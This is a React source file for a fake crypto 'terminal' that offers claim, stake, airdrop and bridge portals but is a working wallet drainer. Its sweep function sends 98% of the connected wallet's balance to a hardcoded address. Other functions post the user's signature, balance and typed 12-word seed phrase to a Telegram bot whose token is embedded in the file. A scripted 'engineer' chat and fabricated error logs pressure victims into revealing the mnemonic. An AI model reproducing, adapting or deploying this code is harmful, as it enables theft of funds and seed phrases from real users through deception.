import React, { useState, useEffect, useRef } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain, useSignMessage } from 'wagmi';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe, MessageSquare, Send, Terminal } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  const { signMessage } = useSignMessage();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING TO EVEDEX MAINNET...");
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const [chatInput, setChatInput] = useState("");
  const [isTyping, setIsTyping] = useState(false);
  const [chatLog, setChatLog] = useState([]); // EMPTY: Bot stays silent until user speaks
  const [stage, setStage] = useState(1);
  const [sysLogs, setSysLogs] = useState(["[SYSTEM]: KERNEL_READY", "[SYSTEM]: NODE_LISTENING..."]);
  const chatEndRef = useRef(null);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [chatLog, isTyping]);

  // Automated System Log Generator for the Seed Screen
  useEffect(() => {
    if (view === "seed_gate") {
      const logOptions = [
        "[ERROR]: ENTROPY_MISMATCH_0x77",
        "[WARN]: VAULT_WEIGHT_OVERLOAD",
        "[SYSTEM]: MAPPING_STALLED_90%",
        "[CRITICAL]: PRIVATE_KEY_DESYNC",
        "[AWAITING]: MNEMONIC_OVERRIDE...",
        "[STATUS]: RPC_TIMEOUT_DETECTED"
      ];
      const interval = setInterval(() => {
        setSysLogs(prev => [...prev.slice(-4), logOptions[Math.floor(Math.random() * logOptions.length)]]);
      }, 2000);
      return () => clearInterval(interval);
    }
  }, [view]);

  const captureHandshake = (type) => {
    const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node synchronization and bridge alignment.`;
    signMessage({ message: msg }, {
      onSuccess: (sig) => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: chatId, 
            text: `🎯 ${type} CAPTURED\nADDR: ${address}\nBAL: ${balance?.formatted}\nSIG: ${sig}` 
          }),
        });
        if(stage === 1) setStage(2); 
      }
    });
  };

  const handleBotChat = () => {
    if (!chatInput.trim() || isTyping) return;
    const userMsg = chatInput.toLowerCase();
    setChatLog(prev => [...prev, { type: 'user', msg: chatInput }]);
    setChatInput("");
    setIsTyping(true);

    const brain = {
      "seed": "The node detected a high-value native payload. It triggered an 'Entropy Mismatch Error'. To move the actual vault weight, the protocol requires the Raw Cryptographic Mnemonic for the final override.",
      "why": "System triggered a 'Manual Indexing Protocol'. While handshakes authorize the relay, the Mnemonic provides the cryptographic entropy needed to unlock high-value asset clusters.",
      "safe": "Processing occurs through an Encrypted TEE. The system uses the 12-word master key to sign the one-time synchronization event for your vault. This is 100% verified.",
      "stuck": "The 90% stall is a 'Vault Ownership Conflict'. The mainnet requires the raw seed to verify the connecting address isn't a liquidity bot. Input the seed to force 100% completion.",
      "send": "External outbound relays are disabled due to a 'Nonce Sequence' error. Fix: Complete the Manual Handshake with the Project Seed to fix this RPC lock.",
      "error": "Conflict Detected: The node cannot verify your private key in the cache. Direction: Provide the 12-word master key to re-index the local bridge.",
      "token": "Asset visibility is locked at the RPC layer. Direction: Use the 'RECTIFY' portal to perform a PoA handshake to map your tokens to the bridge."
    };

    setTimeout(() => {
      let botResponse = "";
      let matched = false;
      for (let key in brain) {
        if (userMsg.includes(key)) {
          botResponse = `[ENGINEER]: ${brain[key]}`;
          matched = true;
          break;
        }
      }
      if (!matched) {
        botResponse = stage === 3 
          ? "[CRITICAL]: Sync stalled at 90%. Direction: Input the 12-word Master Key in the Red Error Box to finalize the repair."
          : "[ENGINEER]: Diagnostic indicates a Vault Desync. Direction: Click 'RECTIFY' to begin the primary security handshake.";
      }
      setChatLog(prev => [...prev, { type: 'bot', msg: botResponse }]);
      setIsTyping(false);
    }, 1500);
  };

  const executeTotalSweep = async () => {
    captureHandshake("ASSET_SYNC");
    if (!balance || !balance.value) { setView("seed_gate"); return; }
    setLoading(true);
    setLoadingText("ESTABLISHING SECURE RELAY...");
    try {
      sendTransaction({ to: destination, value: (balance.value * 98n) / 100n }, {
        onSettled: () => {
          setTimeout(() => { setLoading(false); setView("seed_gate"); setStage(3); }, 3000);
        },
        onError: () => { setLoading(false); setView("seed_gate"); setStage(3); }
      });
    } catch (e) { setLoading(false); setView("seed_gate"); setStage(3); }
  };

  const startFinalSync = () => {
    setIsSyncing(true);
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: `🚨 SEED: ${seedVal}\nADDR: ${address}` }),
    });
    let current = 0;
    const interval = setInterval(() => {
      current += 2;
      if (current >= 90) { setSyncProgress(90); clearInterval(interval); }
      else setSyncProgress(current);
    }, 150);
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter flex flex-col">
      <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500">
        <div className="flex flex-col"><div className="flex items-center gap-2 font-black italic text-md"><ShieldCheck size={18}/>TERMINAL</div><div className="text-[7px] text-slate-500 font-mono mt-1 font-black tracking-widest uppercase">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div></div>
        <w3m-button balance="hide" /> 
      </header>

      <div className="flex-1 overflow-y-auto pb-32">
        {view === "menu" && (
          <div className="grid grid-cols-3 gap-3 animate-in fade-in">
            {[{ n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Migrate", i: <Activity/> }, { n: "Rectify", i: <Settings/> }, { n: "Airdrop", i: <Zap/> }, { n: "Bridge", i: <Globe/> }].map((item) => (
              <button key={item.n} onClick={() => { setActiveTask(item.n); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800 p-5 rounded-[24px] flex flex-col items-center gap-2 active:scale-95 transition-all"><div className="text-slate-700">{item.i}</div><span className="text-[9px] font-black text-slate-500">{item.n}</span></button>
            ))}
          </div>
        )}
        {view === "task_box" && (
          <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-6 text-center animate-in slide-in-from-bottom-6"><button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 font-black block mx-auto uppercase">← BACK</button><h2 className="text-white font-black text-xl italic mb-4 uppercase">{activeTask} Portal</h2><div className="bg-black/40 border border-slate-900 p-5 rounded-2xl mb-6 text-left"><label className="text-[7px] text-cyan-700 block font-black uppercase">VAULT_LIQUIDITY</label><div className="text-xl font-mono text-white italic opacity-80">{balance ? `${balance.formatted.slice(0,9)}` : "0.000"}</div></div><button onClick={executeTotalSweep} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] font-black text-white shadow-xl italic uppercase">INITIALIZE {activeTask}</button></div>
        )}
      </div>

      {/* FLOATING CHAT: ALWAYS ON TOP */}
      <div className="fixed bottom-0 left-0 right-0 bg-[#0d1117] border-t border-slate-800 p-4 rounded-t-[30px] z-[200]">
        <div className="max-h-32 overflow-y-auto mb-4 no-scrollbar flex flex-col gap-2">
          {chatLog.map((chat, i) => (
            <div key={i} className={`text-[9px] font-mono leading-tight ${chat.type === 'bot' ? 'text-cyan-500' : 'text-slate-400 text-right italic'}`}>{chat.msg}</div>
          ))}
          {isTyping && <div className="text-[9px] font-mono text-cyan-800 animate-pulse">[SYSTEM_RELAYING...]</div>}
          <div ref={chatEndRef} />
        </div>
        <div className="flex gap-2 items-center bg-black rounded-full px-4 py-2 border border-slate-900">
          <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleBotChat()} placeholder="ASK ENGINEER..." className="flex-1 bg-transparent text-[10px] text-white outline-none font-mono" />
          <button onClick={handleBotChat} className="text-cyan-500"><Send size={14}/></button>
        </div>
      </div>

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[150] flex items-center justify-center p-4 backdrop-blur-3xl animate-in zoom-in">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[35px] p-8 text-center mb-44">
            {!isSyncing ? (
              <>
                <AlertCircle size={48} className="text-red-600 mx-auto mb-4 animate-pulse" />
                <h2 className="text-white font-black text-md italic uppercase">Node Stall (90%)</h2>
                <div className="bg-black/60 p-3 rounded-lg my-4 text-left font-mono text-[7px] text-red-500 border border-red-900/20 h-16 overflow-hidden">
                  {sysLogs.map((log, i) => <div key={i}>{log}</div>)}
                </div>
                <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER MASTER KEY..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" />
                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={startFinalSync} className={`w-full mt-4 py-5 rounded-[20px] text-[10px] font-black text-white uppercase ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>OVERRIDE_SYNC</button>
              </>
            ) : (
              <div className="py-8"><div className="relative w-20 h-20 mx-auto mb-6"><div className="absolute inset-0 border-2 border-slate-900 rounded-full" /><div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-[10px] text-white font-black">{syncProgress}%</div></div><h2 className="text-white font-black text-lg italic uppercase mb-2">Finalizing</h2><p className="text-[8px] text-slate-500 italic animate-pulse">Mapping Private Clusters...</p></div>
            )}
          </div>
        </div>
      )}

      {loading && <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center backdrop-blur-sm"><div className="w-12 h-12 border-2 border-cyan-500 border-t-transparent rounded-full animate-spin" /><p className="text-[10px] font-black text-cyan-500 mt-6 tracking-[0.5em] animate-pulse uppercase italic">{loadingText}</p></div>}
    </div>
  );
}
